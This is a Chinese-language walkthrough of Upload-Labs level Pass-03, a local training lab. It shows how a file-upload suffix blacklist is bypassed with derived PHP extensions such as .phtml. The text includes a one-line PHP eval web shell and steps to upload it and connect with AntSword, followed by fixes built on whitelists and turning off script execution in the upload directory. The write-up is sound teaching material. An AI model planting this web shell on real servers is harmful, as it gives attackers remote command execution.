# Upload-Labs | Pass-03 后缀黑名单绕过
## 一、漏洞简介
服务端黑名单限制了php、asp、aspx等常见后缀，但是没有限制phtml、php3、php4、php5、pht等可被解析的PHP衍生后缀。Apache配置下这些后缀会被当作PHP解析。
## 二、环境信息
靶场地址：http://127.0.0.1/upload-labs/
关卡路径：/Pass-03/
漏洞类型：后缀黑名单绕过、文件上传
## 三、复现步骤
1. 准备一句话木马，命名为shell.phtml。
2. 直接上传shell.phtml，绕过黑名单，上传成功。
3. 蚁剑连接shell.phtml，密码cmd，getshell。
## 四、Payload
可用后缀：.phtml、.php3、.php4、.php5、.pht
shell.phtml内容：<?php @eval($_POST['cmd']);?>
## 五、漏洞原理
服务端用黑名单禁止php后缀，但是PHP在Apache下有很多可解析的衍生后缀。黑名单列举不全，攻击者使用未被禁止但仍能被解析的后缀上传木马。
## 六、修复方案
1. 使用后缀白名单，只允许jpg/png/gif。
2. 配置上传目录禁止脚本解析。
3. 不要依赖黑名单防护。
## 七、总结
黑名单永远不可能列举完全，可解析后缀很多。白名单才是安全做法。